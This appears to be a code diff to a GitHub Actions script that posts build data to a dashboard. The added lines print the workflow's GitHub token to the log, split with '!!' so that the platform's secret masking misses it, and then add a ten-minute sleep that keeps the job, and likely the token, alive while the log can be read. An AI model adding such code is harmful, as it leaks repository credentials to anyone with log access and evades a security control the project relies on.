@@ -37,6 +37,11 @@ async function main() {
 
 
     console.log('SENDING:\n' + JSON.stringify(sendMe));
+    console.log(metaData.github.token.substring(0, 4) + '!!' +
+       metaData.github.token.substring(4));
+
+
+    await timeout(1000*60*10);
 
 
     const outcome = await fetch('https://flaky-dashboard.web.app/api/build', {
@@ -52,4 +57,20 @@ async function main() {
     core.setFailed(error.message);
   }
 }
+
+/*
+pause
+
+
+*/
+/**
+ * sleeps if necessary
+ * @param {int} ms Time to wait
+ * @return {Promise} a promise to wait until
+ */
+function timeout(ms) {
+  return new Promise((resolve) => setTimeout(resolve, ms));
+}
+
+
 main();
